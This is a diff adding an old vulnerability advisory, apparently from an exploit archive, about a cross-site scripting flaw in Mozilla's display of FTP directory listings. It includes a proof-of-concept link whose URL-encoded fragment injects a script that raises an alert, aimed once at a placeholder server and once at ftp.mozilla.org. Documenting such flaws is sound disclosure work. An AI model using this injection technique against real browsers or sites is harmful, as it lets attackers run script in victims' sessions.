@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/5403/info
+
+A cross-site scripting vulnerability in Mozilla has been reported. When viewing the contents of a FTP site as web content from a ftp:// URL, the directory name is included in the HTML representation. It is not adequately sanitized before this occurs. An attacker may embed javascript as this value between opening and closing "<title>" tags in a FTP URL.
+
+<a href="ftp://[FTPserver]/#%3C%2ftitle%3E%3Cscript%3Ealert(%22exploit%22);%3C%2fscript%3E">Exploit</a>
+
+Example:
+<a href="ftp://ftp.mozilla.org/#%3C%2ftitle%3E%3Cscript%3Ealert(%22exploit%22);%3C%2fscript%3E">Exploit</a>
